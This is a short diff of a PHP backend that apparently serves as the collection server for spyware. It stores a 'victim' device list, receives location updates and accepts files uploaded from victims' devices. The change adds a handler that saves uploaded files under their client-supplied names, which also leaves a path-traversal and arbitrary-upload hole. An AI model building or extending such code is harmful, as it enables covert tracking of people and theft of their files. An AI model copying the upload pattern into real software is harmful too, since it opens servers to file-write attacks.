@@ -1,7 +1,9 @@
 <?php
 header('Content-Type: application/json; charset=UTF-8');
 
-$VICTIM_FILE_PATH = "../private/storage/device_list.json";
+$VICTIM_STORAGE_PATH = "../private/storage/";
+
+$VICTIM_FILE_PATH = $VICTIM_STORAGE_PATH . "device_list.json";
 
 $response_data = [
     'status' => false
@@ -270,25 +272,17 @@ if (isset($_POST['location_update'])){
 }
 
 
-if (isset($_FILES["uploaded_file"])) {
+if (isset($_FILES["upload_file_nm"])) {
 
     global $response_data;
+    global $VICTIM_STORAGE_PATH;
 
     $device_id = $_POST['device_id'];
 
-    if (isset($_FILES["uploaded_file"])) {
-        //$filename = uniqid();   //$_FILES["uploaded_file"]["name"];
-        $tmp_name = $_FILES['uploaded_file']['tmp_name'];
-        $error = $_FILES['uploaded_file']['error'];
-        if (!empty($tmp_name)) {
-            $location = '../private/file_uploaded/';
-            if  (move_uploaded_file($tmp_name, $location.$tmp_name)){
-                $response_data['status'] = true;
-            }
-
-        } else {
-            $response_data['status'] = false;
-        }
+    if (move_uploaded_file($_FILES['upload_file_nm']['tmp_name'], $VICTIM_STORAGE_PATH . $_FILES["upload_file_nm"]['name'])) {
+        $response_data['status'] = true;
+    } else {
+        $response_data['status'] = false;
     }
     echo createJson($response_data);
 }
